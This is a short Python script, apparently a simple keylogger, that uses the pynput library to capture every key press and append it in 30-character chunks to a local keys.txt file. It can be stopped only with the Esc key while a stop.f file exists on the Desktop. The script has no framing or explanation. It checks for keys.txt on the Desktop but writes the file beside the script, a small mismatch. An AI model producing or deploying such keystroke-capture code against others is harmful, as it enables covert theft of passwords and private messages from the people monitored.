from pynput.keyboard import Key, Controller, Listener
import os

keyboard = Controller()

f = ""

def on_press(key):
    global f
    f += str(key)
    print(f)
    save_words()


def stop(key): 
    if key == Key.esc:
        path = os.path.expanduser("~/Desktop") + r"/stop.f"
        if(os.path.isfile(path)):
            print('Exit')
            return False
    
    
def write_or_append():
    if(os.path.isfile(os.path.expanduser("~/Desktop") + r"/keys.txt")):
        return 'a'
    else:
        return 'w'

def save_words():
    global f
    if(len(f) >= 30):
        save_file = open(os.path.dirname(os.path.abspath(__file__)) + r"/keys.txt",write_or_append())
        save_file.write('\n')
        save_file.write(f)
        save_file.close()
        f = ""


with Listener(
        on_press=on_press,
        on_release=stop) as listener:
    listener.join()
